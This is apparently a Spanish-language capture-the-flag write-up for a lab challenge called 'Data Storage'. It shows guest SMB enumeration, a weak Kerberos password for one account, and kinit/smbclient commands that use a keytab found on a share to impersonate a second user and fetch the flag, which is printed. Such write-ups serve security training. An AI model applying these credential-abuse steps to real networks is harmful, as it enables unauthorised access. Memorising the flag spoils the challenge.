# Data Storage

**Estado:** resuelto y validado  
**Flag:** `FLAG{ShWJ-CVi0-cZ2W-7DsZ}`

## Resolución

El recurso SMB es `smb.nren.tcc`. El acceso de invitado permite leer `public/`, donde aparecen dos pistas:

- `it_notice.txt` indica que los recursos SMB requieren Kerberos, el realm es `NREN.TCC` y el KDC es `kdc.nren.tcc`.
- `teambuilding.txt` enumera las cuentas de la organización.

Con la cuenta `jane@NREN.TCC` se puede obtener un ticket Kerberos y listar `//smb.nren.tcc/private`. La contraseña encontrada para esta cuenta es `12345`.

```sh
printf '12345\n' | KRB5_CONFIG=/tmp/krbfast.conf \
  KRB5CCNAME=FILE:/tmp/jane.ccache kinit jane@NREN.TCC
KRB5_CONFIG=/tmp/krbfast.conf KRB5CCNAME=FILE:/tmp/jane.ccache \
  smbclient -k //smb.nren.tcc/private -c 'recurse;ls'
```

El listado expone, dentro de `kevin/`, un `kevin.keytab` y `flag.txt`. El ticket de Jane no tiene permisos para leer esos dos archivos, así que se usa el keytab para autenticarse como Kevin:

```sh
KRB5_CONFIG=/tmp/krbfast.conf KRB5CCNAME=FILE:/tmp/kevin.ccache \
  kinit -kt evidence/kevin.keytab kevin@NREN.TCC
KRB5_CONFIG=/tmp/krbfast.conf KRB5CCNAME=FILE:/tmp/kevin.ccache \
  smbclient -k //smb.nren.tcc/private \
  -c 'get kevin/flag.txt evidence/flag.txt'
```

El contenido de `kevin/flag.txt` es la flag indicada arriba.

## Evidencia

- [Flag recuperada](evidence/flag.txt)
- [Keytab de Kevin](evidence/kevin.keytab)
- [Aviso de IT](../../it_notice.txt)
- [Tabla de teambuilding](../../teambuilding.txt)
